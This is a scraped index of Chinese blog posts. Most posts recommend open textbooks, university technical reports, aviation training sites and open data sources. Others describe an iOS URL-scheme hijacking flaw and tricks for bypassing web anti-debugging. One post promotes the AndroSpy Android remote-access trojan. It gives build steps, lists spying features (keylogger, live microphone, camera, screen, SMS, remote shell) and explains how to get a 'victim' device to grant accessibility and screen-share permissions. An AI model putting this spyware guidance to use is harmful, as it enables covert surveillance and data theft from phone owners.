这个漏洞是15年在乌云爆出来的，漏洞编号为：wooyun-2015-0103233，大家可以自行去查看。 这个问题说白了是一个流程上的缺陷，苹果官方没有限制APP定义的URL Schemes名字，导致其他APP也可以定义“支付宝”的URL Schems名字；又因为iOS系统判定URL Schemes优先级顺序与 Bundle ID 有关（一个 Bundle ID 对应一个应用），如果有人精心伪造 Bundle ID，iOS 就会调用恶意 App 的 URL Schemes 去接收相应的 URL Schemes 请求，这就导致了可以被劫持。 结尾 还有很多思路等着我们去探寻，此文仅做思路启发。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-08","objectID":"/zh-cn/8/:7:0","tags":["漏洞","iOS"],"title":"iOS URL Schemes与漏洞的碰撞组合","uri":"/zh-cn/8/"},{"categories":["书库"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 一个多学科高质量开放教科书库 开放教科书库(Open Textbook Library)由明尼苏达大学开放教育中心和开放教科书网络(Open Textbook Network)提供支持。由于普通学生每年为书籍预算支出上千美元，开放教科书库的建立旨在为师生找到优质教科书，此库拥有多学科领域的免费教科书资源，“开放教科书库”是一个全面的参考资料库，通过链接方式集合了多家教科书资源，包括 OpenStax，Saylor 等。所有开放教科书保障必须支持一个学期的课程。你可以在线阅读，也可以下载 PDF 格式，或 EPUB 和 HTML 等阅读。开放式教科书库为学生节省了一笔不小的书籍开支。所有开放教科书是经过资助，出版和许可的教科书，可以自由使用，改编和分发，通过各领域专业人士协作完成电子书制作并不断丰富书籍内容，这些书籍由具有学科领域专业知识的教师专家使用评估标准进行严格审查，书库中大约60%的书籍已经过各种学院和大学的教师评估，确保了书籍质量。 目前开放教科书库流量每天都在增长，越来越多的人访问该库，并在课程中使用这些教科书。 访问 https://open.umn.edu/opentextbooks/subjects 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-06","objectID":"/zh-cn/6/:0:0","tags":["书库"],"title":"一个多学科高质量开放教科书库","uri":"/zh-cn/6/"},{"categories":["计算机科学技术报告"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 世界一流大学计算机科学技术报告可免费下载阅读 ","date":"2022-01-05","objectID":"/zh-cn/5-1/:0:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["计算机科学技术报告"],"content":"斯坦福大学计算机科学技术报告和技术笔记 斯坦福大学计算机系一直是全球计算机学科顶级的学校之一,计算机理论、硬件、软件、数据库和人工智能等各个领域都居于美国乃至世界领先地位。斯坦福大学在电子计算机领域的各种改变世界的成就，每一个科研成果都能牵动世界计算机的发展。如果你想了解大牛都在研究什么可以读读他们的研究文章，斯坦福大学计算机科学技术报告和技术笔记(60年代至今)是可以免费在线访问的。 访问 http://infolab.stanford.edu/TR/ ","date":"2022-01-05","objectID":"/zh-cn/5-1/:1:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["计算机科学技术报告"],"content":"加州大学伯克利分校电子工程和计算科学技术报告 加州大学伯克利分校是世界殿堂级名校之一。UCB的计算机专业算得上最大的系之一，加州大学伯克利分校的电子与计算机领域技术报告可在线免费获取。这里列出的技术报告包括EECS技术报告系列（从2005年10月开始），CS技术报告系列（从1982年到2005年）和ERL技术报告系列（从1962年到2005年）。几乎所有情况下都包含指向全文的链接。 访问 https://www2.eecs.berkeley.edu/Pubs/TechRpts/ ","date":"2022-01-05","objectID":"/zh-cn/5-1/:2:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["计算机科学技术报告"],"content":"剑桥大学计算机实验室技术报告 自1974年以来，剑桥大学计算机实验室就发布了《技术报告》系列（ISSN 1476-2986）。这是一个基于主题的知识库，可从剑桥大学大学的计算机科学系（“计算机实验室”）访问技术报告。大多数较新的技术报告，尤其是2002年以来发布的所有技术报告，均以PDF格式在线提供。 访问 https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-table.html ","date":"2022-01-05","objectID":"/zh-cn/5-1/:3:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["计算机科学技术报告"],"content":"伯明翰大学计算机科学领域技术报告 伯明翰大学作为研究型导向的综合性大学，其计算机专业有着超高的地位。伯明翰大学计算机科学学院现在提供基础和应用计算机科学，人工智能，优化，计算机安全，医学成像和机器人技术方面的专业教学并进行世界领先的研究。该学院研究技术报告已在线存档，并提供检索下载。 访问 http://www.cs.bham.ac.uk/research/tech-reports/search.php ","date":"2022-01-05","objectID":"/zh-cn/5-1/:4:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["计算机科学技术报告"],"content":"华威大学计算机科技报告 华威大学(University of Warwick)是一所稳居世界百强的顶尖研究型大学，其科研报告及论文具有较高的学术价值，华威大学所有技术报告和论文都存储在Warwick WRAP存储库中，你可以免费获取到该校各学科研究成果全文，包括期刊文章、博士论文、会议及工作论文和数据集等，要获取计算机领域研究成果你可以在WRAP Web中搜索计算机科技报告找到。 访问 https://wrap.warwick.ac.uk/cgi/search/advanced 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-05","objectID":"/zh-cn/5-1/:5:0","tags":["计算机科学技术报告"],"title":"世界一流大学计算机科学技术报告可免费下载阅读","uri":"/zh-cn/5-1/"},{"categories":["培训","学习","资源"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 一个专门收集空客系列飞机培训学习资源站 分享了一个波音737技术站：推荐一个由波音737飞行员和工程师维护的技术站，这个推荐正好满足了一些人的需求，同时也有人回复问有没有空客 320 相关的网站，今天就分享了一个关于空客系列飞机学习培训资源站， www.airbusdriver.net， 网站维护人鲍勃·桑福德在美国航空主要从事培训和飞行操作工作，已经退休，但是该网站会继续运营下去，至今网站已运行二十余年。 该网站的培训重点是空客 A319/320/321 系列飞机。包括《模拟器标注和方法简报指南》，《类型评定口头指南》和《 CQ 方案》。也有几种学习辅助工具。网站相关学习资料非常丰富，并不断更新最新的内容。对于那些想在培训前开始准备的人强烈推荐利用airbusdriver网站上的资源学习。希望这个推荐对你有用。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-05","objectID":"/zh-cn/5/:0:0","tags":["培训","学习","资源"],"title":"一个专门收集空客系列飞机培训学习资源站","uri":"/zh-cn/5/"},{"categories":["手机"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 您的手机真的安全吗？RAT带你走进不一样的安卓系统 人都说自己的手机很安全，但是在白帽黑客眼里，任何系统都不是绝对的安全，甚至IOS也曾经被攻破过。当年泛滥的网劫马和短信马以及苹果的企业签名，可以说将这个圈子搅得一塔糊涂。以前有幸看过别人演示攻击过程，不过针对的的安卓系统较低，或者本地未装安全APP的系统。而本次的Rat相较于Spynote它更具有隐藏性，测试的对象也更为广泛，甚至包括了华为的鸿蒙系统。 AndroSpy – Xamarin-C# Android RAT 一个完全用 C# 编写的 Android RAT。 是的，它支持 dns 连接，如 no-ip、duckdns 或 dynu 等，并且已经用 ngrok 和 portmap.io 进行了测试；它适用于两者，但由于 UDP 端口，您无法听到现场麦克风。（仅在 AndroSpy 的公共版本上） 编译 第1步： [!] 在 VISUAL STUDIO 中编译一次客户端项目，然后进行底部步骤，否则您会在 Builder 中看到错误。 –\u003e（由于 NUGET 数据包需要此步骤。）如果您在 Visual Stuido 中看到 Nuget 包错误，请下载此 .zip 并解压缩到客户端项目的路径 然后关闭 Visual Studio 并重新打开客户端项目 (Task2.sln)，然后清理项目并重新构建客户端项目。 下载Nuget包 ＃＃ 第2步： [!] 然后你必须在AndroSpy的设置窗口中放置每个.exe的路径，并将Client项目的所有文件复制到SV项目中的“ProjectFolder”路径（\\SV\\bin\\Debug\\resources\\ProjectFolder） [!] 重要提示：从 Visual Studio 安装路径中选择 MSBuild.exe，而不是从 .NET Framework 中选择； {Visual Studio 安装驱动}\\Microsoft Visual Studio{VERSION}{EDITION}\\MSBuild\\Current\\Bin\\MSBuild.exe； 完成上图中的设置后，您现在可以创建客户端。 最近 Android 10 更新后的麦克风问题： https://forum.xda-developers.com/t/microphone-issue-after-recent-android-10-update.4085727/page-2 生成方式 别担心，没有复杂的“Socket”编程；一切都很容易理解。 -您还必须打开UDP端口；在Modem的NAT页面的comboBox中选择项目：TCP和UDP（两者），否则你听不到现场麦克风。 对于键盘记录器，您的测试必须在设备设置中打开木马的辅助功能按钮 最低安卓版本：4.1 在一些系统上测试： 安卓 4.4.2 – 好的 安卓 5.1.1 – 好的 安卓 7.1.2 – 好的 安卓 6.0.1 – 好的 安卓 9.0 – 好的 Android 10 – 好的 AndroSpy 项目旨在实现最强大、稳定、有用的开源 Android RAT。 在设备上安装后门后，它会显示屏幕共享弹出框，请接受此框并选中“不再显示”。 适用于所有网络类型：2G、3G、4G、4.5G、WI-FI…..；不仅可以在本地网络中工作，还可以在 WAN 中工作。 经常检查 AndroSpy 的 github repo 上的更新以获得最佳用户体验。 对于华为和其他EMUI设备，添加了开发者的代码建议；唤醒锁标签：“LocationManagerService” （以下图片不是最新图片。） 更新日志 2021年7月24日 永久修复重新连接问题（感谢乒乓方法。）（如果超时为 15 秒，则重新连接）。 一些更改、编辑等。 2021年6月25日 重新连接问题已修复。 添加外壳终端。 添加工具提示 ping 状态（0m 0s 30ms）（将鼠标移到测试的图像上） 实时摄像头得到改进。 套接字通信得到改进。 添加了 RAM 和内部存储信息。（带工具提示） 一些视觉改进（文本字体、文字等） 添加了充电状态图像和 wifi 信号强度图像。（带工具提示） 和其他人… 2021年5月20日 为 Builder 添加了 CPU-Wakelock 选项。（高连接性能） 生成器选项现在会自动保存。 视觉变化（现在可以最大化所有窗口） 内存泄漏优化。 代码优化。 一些小的改动、修复和改进 2021年4月21日 修复了文件管理器中的一个小错误 修复了 android 9.0 以上的已安装应用图标 一些小的改动、修复和改进 2021年3月6日 使用并查看。 2021年2月21日 切换到基于服务的应用程序。 一些改进。 2021年2月7日 GUI 已完全重新设计。 Builder 错误已修复（因误用“/”标记而导致的错误） 一些稳定性有所改善。 +还有其他我忘记写在这里的….:) 2021年1 月30日 可以多个操作手柄；多个文件上传和下载，同时观看实时摄像头或屏幕观看，下载或上传多个文件。 修复了构建器错误。现在不会有错误了。 性能提高。 当打盹模式（睡眠模式）时，您的测试者可以手动将警报管理器连接到服务器并与您通信。 如果服务器没有互联网，测试者可以在服务器上有互联网的情况下重新连接到服务器。 我目前禁用了来自相机的快照。[我懒得为新的 Socket 实例重新编码:)]。 添加了emui设备（华为、OPPO、Honor等…）的后台工作设置。 以及一些错误修复、性能稳定等…… 2021年1月24日 Socket 通信已完全重新编码；高质量的相机视图，快速和轻松的通信。完全与 byte[] 数组通信；它摆脱了 Base64，快速而轻松的通信。 图形用户界面已更新。 +文件下载和发送代码，照片捕获代码通过创建缓冲区重新编码。 +“夜间模式”已添加到实时相机形式和实时屏幕形式中。 为客户端添加了关闭、重新连接和删除选项。 和其他改进 – 修复.. 2020年12月 +CPU 唤醒锁现在是 Builder 中的用户选择。 +添加了“密码”属性以确保您和您的客户端之间的连接安全。 +WakeLock 功耗优化；我们的客户使用尽可能少的电池。 +在电话状态窗口中增加了“详细信息”选项卡，您可以看到；详细的 IMEI、SIM 信息等.. +修复了设备没有互联网时导致的高 CPU 使用率问题。 +实时摄像头的对焦模式现在是用户的选择。 添加了实时屏幕（MediaProjection API 从 API Level 21 开始可用，更多信息：https://developer.android.com/reference/android/media/projection/MediaProjection +文件管理器得到了改进。 +全英文版本。 +现在支持5位端口。 +修复了英国国旗问题。 +如果设备没有任何摄像头，您将看到警告消息。 +添加测试姓名和IP地址作为控制窗口的标题。例如：键盘记录器 – Victim@192.168.2.78:7675 和其他更改、修复、改进。:) 版本 3 +添加实时相机流（具有分辨率、变焦、闪光灯、质量控制和场景、对焦、白平衡模式） +固定丢失数据传输 +一些多余的代码已被删除 +性能有所提高 [+] 版本 V2 更新 +添加日志。 +在文件管理器中添加了单击图像的预览。 +添加了前后摄像头的选择尺寸。 +一些其他修复和更改。 [+]版本更新2（第一次更新为版本） +直接从“System.Net.Sockets.Socket”通信切换到“System.Net.Sockets.NetworkStream”。这种变化更加稳定和快速。并且 Project 有更清晰的代码。 +在电话信息表单中添加了 Wifi、蓝牙、移动数据等。 +在设置面板中添加了屏幕亮度选项。 +一些重要的更新-变化。 [+]Update 1.3（第一个稳定更新） +在趣味管理器中添加了“将快捷方式添加到主屏幕”选项。 +在任何测试开始拨入或拨出呼叫时显示的窗口中添加了电话号码名称。 +a SMS Manager 中的更正。 [+]更新 1.2 +客户端和服务器之间","date":"2022-01-03","objectID":"/zh-cn/3-2/:0:0","tags":["手机"],"title":"您的手机真的安全吗？RAT带你走进不一样的安卓系统","uri":"/zh-cn/3-2/"},{"categories":["Web","JavaScript"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # web反调试之无限debugger饶过方案汇总 某些网站的前端代码反调试，打开控制台要看Network，控制台不断的debugger ","date":"2022-01-03","objectID":"/zh-cn/3-1/:0:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["Web","JavaScript"],"content":"方案一：右击debugger行数位置，点击add conditional breakpoint.. 添加false，然后按回撤， 刷新网页，发现成功跳过无限debugger ","date":"2022-01-03","objectID":"/zh-cn/3-1/:1:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["Web","JavaScript"],"content":"方案二：文件替换 1.在js文件右击， 然后点击save as ..., 把js文件保存到本地。 2.修改保存到本地的js文件，将debugger成false保存js文件 3.在浏览器Soures获取需要替换的js文件url 4.使用fiddler动态拦截替换js，刷新网页即可 ","date":"2022-01-03","objectID":"/zh-cn/3-1/:2:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["Web","JavaScript"],"content":"方案三：代码注入，注入代码到js文件 //1 .去除无限debugger Function.prototype.__constructor_back = Function.prototype.constructor; Function.prototype.constructor = function() { if(arguments \u0026\u0026 typeof arguments[0]==='string'){ //alert(\"new function: \"+ arguments[0]); if(\"debugger\" === arguments[0]){ //arguments[0]=\"console.log(\\\"anti debugger\\\");\"; //arguments[0]=\";\"; return } } return Function.prototype.__constructor_back.apply(this,arguments); } ","date":"2022-01-03","objectID":"/zh-cn/3-1/:3:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["Web","JavaScript"],"content":"方案四：手动替换 我们先构造一个空方法 将目标网站的方法偷梁换柱 由于网站代码强混淆，所以函数名称会不一样。下面放个GIF图 完美解决 但是注意不要刷新，页面刷新后需要重新替换。 ","date":"2022-01-03","objectID":"/zh-cn/3-1/:4:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["Web","JavaScript"],"content":"方案五：禁用浏览器断点 点击图中按钮，之后将不会再命中任何断点。这种方法虽然可以防止无限循环命中debugger断点，但是也存在很大的缺陷，因为对于其他代码，我们还是需要断点调试功能的。所以这个方法仅限于静态分析 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-03","objectID":"/zh-cn/3-1/:5:0","tags":["Web","JavaScript"],"title":"web反调试之无限debugger饶过方案汇总","uri":"/zh-cn/3-1/"},{"categories":["波音737","工程师","维护","技术站"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 推荐一个由波音737飞行员和工程师维护的技术站 波音 737 技术站: http://www.b737.org.uk 这是一个由来自世界的波音 737 飞行员和工程师维护的网站，该网站主要维护者克里斯·布雷迪，毕业于利物浦大学。主要对 737 进行了后期维护和客户演示测试飞行，积累了 18 年的经验。该网站提供了波音 737 各方面技术资料，在这里你可以找到737相关技术、操作及培训笔记及技术图片资源。网站维护者汇集整理一个包含成千上万张高分辨率技术图像库。个人可以随意使用网站里呈现的内容，如果你是一个组织，那么需要获得这些图片的使用许可。注:本网站和波音公司无任何关系，是由个体维护的一个技术站。 简单介绍一下网站涵盖的内容类别，该网站主要是介绍 737 各方面的技术内容，如：飞行系统详解；系统问题测试；飞行员笔记；技术指标；小翼详解；有关 737- MAX 的详细信息；737系列生产销售情况以及历史发展及变体；还包括了很多技术图片以及飞行甲板照片以及关于严重事件的新闻报道等。 飞行系统-可以了解到飞行系统各部分的使用解读及图示说明。 系统测试-本部分包含 800 多个 737 系统问题选择题。这些题目有助于更好的解决遇到的系统问题。该测验基于 737NG，但通常在未明确指定的情况下适用于所有机型系列。 飞行员笔记-737 系列的飞行员和工程师笔记汇编，以帮助读者深入理解飞机。 技术图片-包含约 400 张照片，详细介绍了 737 的各个组件和功能。 飞行甲板照片-737 每一代飞机的总体飞行甲板视图。有助于了解不同系列之间的差异。 小翼详解-详细说明了 737 不同类型的小翼及益处。 技术指标-包括了各机型的生产单位、发电系统、机身、机翼高举设备、起落架、远程巡航、最大有效载荷范围设计参数等数据指标，由工程师更新数据来自多方来源。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-03","objectID":"/zh-cn/3/:0:0","tags":["波音737","工程师","维护","技术站"],"title":"推荐一个由波音737飞行员和工程师维护的技术站","uri":"/zh-cn/3/"},{"categories":["航空航天领域技术报告"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## 在线获取航空航天领域技术报告 NASA 技术报告服务器（NTRS-NASA Technical Reports Server ）提供对航空航天相关引文，全文在线文档，图像和视频的访问。所包含的信息类型有：学术会议论文，期刊文章，会议记录，专利，研究报告，图像，电影和技术视频 - 由 NASA 创建或资助的科技信息。 NTRS 美国航空航天局技术报告系统报道 NASA 报告及其它有关航天科技文献（不包括期刊）的文摘刊物、NASA 合同用户提供的科技报告；美国其他政府机构、国内外学术机构、大学及私营公司发表的科技报告；NASA 所拥有的专利、学位论文和专著；外国公开发表的科技报告。全文文献 28 万多篇，影音图像 51 万多，其他来源文献 17 万多篇。学科范围包括 10 大类，76 小类，10 大类分别为：航空学、宇航学、化学和材料、工程学、地球科学、生命科学、数学和计算机科学、物理、社会科学和空间科学。 资源情况 在线 NTRS 全文 （282661） 链接到外部全文来源 （81502） 电影/视频 （1322） 照片/图像 （465841） 可根据要求提供 （33752） 从其他来源获取 （169248） NTRS 由三部分组成：NACA 数据库、NASA 数据库和 NIX 数据库。 NACA(National Advisory Committee for Aeronautics)是 NASA 的前身，数据集包含了自 1915 年至 1958 年航空领域的文献索引和技术报告。 NASA 数据集收录了 1958 年至今由 NASA 赞助项目产生的科研文献索引和文档。 NIX(NASA Image eXchange)数据集则包含了有关图像、照片、影片、视频等资料的索引和链接。 这些数据集涵盖了丰富的科技报告资源，包括 50 余万条索引、超过 300 万个全文文档、50 余万条图像和视频资料以及来自 NACA 的超过 1.3 万篇早期的全文文献。值得一提的是，在美国政府三大技术报告生产机构(NASA、DOE 和 DoD)中，NASA 的 NTRS 是第一个提供技术报告文献中图像资料线上获取的。 访问 https://ntrs.nasa.gov 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-02","objectID":"/zh-cn/2/:0:0","tags":["航空航天领域技术报告"],"title":"在线获取航空航天领域技术报告","uri":"/zh-cn/2/"},{"categories":["数据源"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ## ","date":"2022-01-01","objectID":"/zh-cn/1/:0:0","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"开放数据源（一），全球地理、自然、经济数据等。 世界银行,数据网站: data.worldbank.org gapminder,编译数据源,包括世界卫生组织和世界银行覆盖经济、医疗和社会统计数据。 美国中央情报局,世界概况,包含267个国家的历史信息、人口、经济、政府、基设施和军事等信息。 国家气候数据中心,巨大的环境、气象和气候数据集来自美国国家气候数据中心。世界上最大的气象数据的归档。 OpenStreetMap,全球范围的免费地图数据，每周动态更新。 亚马逊网络服务公共数据集,巨大的公共数据资源,包括1000基因组计划,试图构建人类遗传信息的最全面的数据库和NASA的地球的卫星图像的数据库。 谷歌趋势,统计搜索量(搜索)总额的比例对于任何给定的期限,自2004年以来。 Facebook Graph 虽然大部分的信息用户的Facebook的个人资料是私人的,很多不是——Facebook提供图形API的方式查询大量的信息,其用户乐于分享与世界(或无法隐藏,因为他们没有了隐私设置工作)。 DBPedia,维基百科是由数百万块的数据,在每个主题在阳光下结构化和非结构化。DBPedia是一个雄心勃勃的项目目录,并创建一个公共、自由可分配的数据库允许任何人来分析这些数据。 社交媒体数据,Topsy公共微博提供了一个可搜索的数据库2006年以及几个工具来分析对话。 Likebutton,矿山Facebook的公共数据——在全球范围内,从您自己的网络给人们“喜欢”的概述。 纽约时报,索引归档的新闻文章回到1851年。 开放数据库,community-compiled数据库结构化数据的人,地方和事情,与超过4500万个条目。 百万歌曲数据集,元数据超过一百万首歌曲和乐曲,亚马逊网络服务的一部分。 欧盟开放数据门户,基于来自欧盟机构的数据。 SDMX,欧洲央行, 美联储 谷歌财经,40年的股票市场数据,实时更新。 金融量化:pydatastream 中国金融,TuShare NASDAQ Data Store：提供市场数据。 美国、欧盟、加拿大、CKAN以及其他的公开政府数据 英国,英国政府的数据,其中包括英国国家参考书目元数据(自1950年以来英国所有书籍和刊物)。 Google Books ngram,搜索和分析全文的数以百万计的图书数字化,作为谷歌图书项目的一部分。 美国联邦政府数据网站, 美国政府承诺可以免费在线所有政府数据,第一阶段已有各种数据。 美国人口普查局,丰富对美国公民的生活人口地理数据和教育的信息。 Healthdata.gov,125年的美国医疗数据包括claim-level医疗数据、流行病学和人口统计数据。 国民健康和社会保健信息中心,来自英国的国家卫生服务的健康数据集。 ","date":"2022-01-01","objectID":"/zh-cn/1/:1:0","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"开放数据源（二），科研、论文，生物、网址、机器学习等。 编译自http://www.bigdata-madesimple.com/70-websites-to-get-large-data-repositories-for-free/ Wikipedia:Database ：向感兴趣的用户提供所有可用的内容的免费副本。可以得到多种语言的数据。内容连同图片可以下载。 Common crawl：建立并维护一个所有人都可以访问的开放的网络。这个数据保存在亚马逊s3bucket中，请求者可能花费一些钱来访问它。 EDRM File Formats Data Set：由381个文件夹200种文件格式组成。 Apache Mahout TLP：项目创建一个可扩展的机器学习算法。Mahout有许多免费的和付费的语料库语料。 StatLib,卡内基梅隆大学数据档案。 STATOO Datasets part 1和 STATOO Datasets part 2，Time Series Data Library。 Visual Analytics Benchmark Repository。 UCI KDD Database Repository：适用于机器学习和知识发现研究的大数据集。 UCI Machine Learning Repository. UCR Time Series Data Archive：提供数据集、论文、链接和代码。 EDRM Enron Email Data Set v2：由安然公司邮件信息和附件组成，存在两组可下载的压缩文件中：XML和PST。 ClueWeb09：用来支持信息检索和相关人类语言技术研究的资料库。它包含了从2009年1月到2月间收集的大约10亿个网页，包含10种语言。资料库被若干TREC会议的追踪检测使用。 DMOZ：最大的、最全面的人工编辑的开放式网站目录。它收集了不同类型的网站链接。Dmoz是互联网搜索引擎的一个主要来源。 theinfo.org：这是一个大数据集网站，在这里学者、设计师、艺术家等可以交流技巧和窍门，一起开发和共享工具，并开始整合他们独有的项目。 Project Gutenberg：提供超过36000免费电子书的下载，可以下载到个人电脑、Kindle, Android, iOS or 或其他便携式设备。 Million song data set：与tracks 和艺术家有关的数据。 AWS (Amazon Web Services) Public Data Sets：提供了可以无缝融入AWS（亚马逊网络服务）云应用的公共数据集的集中存储库。 GeoDa Center：地理和空间数据。 BigML big list of public data sources. Bioassay data：研究文章“生物测定数据的虚拟筛选”，由Amanda Schierz编写，有21个生物测定数据集（活性/非生理活性成分），可以下载。 Bitly 1.usa.gov data：匿名点击链接。 Canada Open Data：有许多政府和地理空间的数据集的试点项目。 Causality Workbench：数据存储库。 Corral Big Data 